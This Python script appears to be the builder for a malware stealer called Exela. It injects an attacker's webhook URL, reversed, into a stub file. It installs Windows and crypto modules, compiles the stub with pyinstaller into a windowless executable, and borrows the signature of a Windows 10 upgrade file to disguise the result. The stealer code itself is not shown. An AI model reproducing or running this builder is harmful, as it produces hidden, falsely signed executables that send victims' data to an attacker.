import os, shutil

webhook = str(input("enter your webhook url : "))
with open("Exela.py", "r", encoding="utf-8", errors="ignore") as sourceCode:
    rip = sourceCode.read()
    replacedCode = rip.replace('%REPLACE_ME_FOR_QUiCADXD%', webhook[::-1])
with open("stub.py", "w", encoding="utf-8", errors="ignore") as f:
    f.write(str(replacedCode))

def installModules():
    try:
        print("installing all module pls wait")
        os.system("pip install psutil")
        os.system("pip install pypiwin32")
        os.system("pip install pycrypto")
        os.system("pip install pycryptodome")
        os.system("pip install pycryptodome")
        os.system("pip install uuid")
        os.system("pip install dhooks")
        os.system("pip install requests")
        os.system("pip install wmi")
        os.system("pip install pyinstaller")
        print("All module installed")
    except:
        print("pls use python 3.10 or 3.11");exit()


def buildFile():
    print("Building Your File pls wait.")
    os.system("pyinstaller --onefile --noconsole --clean stub.py")
    print("File build was succesfully")
    print("Signing file pls wait")
    digitalSign("Windows10Upgrade9252.exe", os.getcwd() + "\\Dist\\stub.exe")
    print("file signed was succesfully")
    try:
        shutil.rmtree("build")
        os.remove('stub.spec')
        shutil.rmtree("dist")
    except:
        pass # sex
      
    os.system("cls")
    print("your file build succesfully\nYour file is => Exela.exe")
    
def digitalSign(path, signedFile):
    os.system(f"python digital-sign.py -i {path} -t {signedFile} -o Exela.exe")

if __name__ == '__main__':
    installModules()
    buildFile()
